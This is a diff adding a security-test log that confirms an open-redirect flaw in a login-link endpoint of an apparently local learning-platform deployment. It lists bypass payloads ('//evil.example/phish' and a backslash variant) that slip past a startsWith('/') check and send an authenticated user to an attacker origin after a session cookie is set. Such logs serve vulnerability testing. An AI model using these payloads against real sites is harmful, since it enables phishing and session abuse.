@@ -1,0 +1,15 @@
+========================================================================
+VULN-025: Open redirect via startsWith('/') accepting protocol-relative //evil
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[SETUP] minting a valid login-link token (self 'view as student' handoff)
+[INFO]   token minted (len=245)
+[STEP] GET /api/auth/login-link?redirect='//evil.example/phish' → HTTP 302  Location='//evil.example/phish'  (protocol-relative → cross-origin)
+[STEP] GET /api/auth/login-link?redirect='/\\evil.example/phish' → HTTP 302  Location='/\\evil.example/phish'  (backslash form (browsers treat /\ as //))
+[STEP] GET /api/auth/login-link?redirect='/lms' → HTTP 302  Location='/lms'  (safe same-origin control (should be accepted verbatim))
+[STEP] GET /api/auth/login-link?redirect='https://evil.example/x' → HTTP 302  Location='/'  (absolute URL control (rejected → falls back to /))
+[PROOF] server emitted Location: '//evil.example/phish' — an attacker-controlled CROSS-ORIGIN redirect from a user-supplied param (open redirect)
+[PROOF] the 3xx follows Set-Cookie: classroomio.session_token → an *authenticated* victim is bounced to the attacker origin (auth-handoff variant)
+[INFO] control: absolute https://evil.example correctly falls back to Location='/' → confirms only the // / /\ bypass slips through startsWith('/')
+==> VULN-025: CONFIRMED — login-link auth-handoff open-redirects to //evil.example + backslash variant; post-Set-Cookie bounce
+[OK] confirmed open redirect (server auth-handoff); client login/signup sinks share the flaw
